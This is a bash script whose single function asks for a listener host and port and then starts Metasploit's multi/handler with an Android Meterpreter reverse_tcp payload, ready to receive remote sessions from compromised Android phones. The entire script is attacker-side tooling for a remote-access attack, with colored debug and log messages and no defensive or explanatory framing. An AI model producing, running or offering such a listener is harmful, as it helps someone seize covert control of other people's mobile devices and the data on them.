#!/bin/bash

default="\033[0m"
red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
cyan="\033[1;36m"

launch_metasploit() {
  echo -e "${cyan}[DEBUG] Launching Metasploit listener...${default}"

  # Prompt for LHOST and LPORT
  read -p "Enter LHOST: " LHOST
  read -p "Enter LPORT: " LPORT

  echo -e "${blue}[DEBUG] Configuring Metasploit with LHOST=${LHOST} and LPORT=${LPORT}...${default}"

  # Launch Metasploit
  msfconsole -x "use exploit/multi/handler; \
                  set payload android/meterpreter/reverse_tcp; \
                  set LHOST $LHOST; \
                  set LPORT $LPORT; \
                  exploit" || {
    echo -e "${red}[ERROR] Failed to launch Metasploit.${default}"
    return
  }

  echo -e "${green}[LOG] Metasploit listener launched successfully.${default}"
}

